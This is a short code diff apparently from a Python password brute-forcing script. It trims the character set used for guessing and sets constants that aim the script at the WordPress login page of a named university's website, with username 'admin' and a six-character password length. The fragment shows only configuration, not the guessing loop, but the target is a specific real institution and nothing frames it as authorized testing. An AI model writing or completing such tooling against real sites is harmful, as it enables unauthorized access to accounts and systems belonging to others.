@@ -4,7 +4,7 @@ import requests
 import time
 import os
 
-CHARACTERS = string.ascii_letters + string.digits + "!@#$%^&*()-_=+[]{}|;:',.<>?/"
+CHARACTERS = string.ascii_letters + string.digits + "!@#$%^&*_/"
 LOGIN_URL = "https://admasuniversity.edu.et/wp-login.php"
 USERNAME = "admin"
 PASSWORD_LENGTH = 6
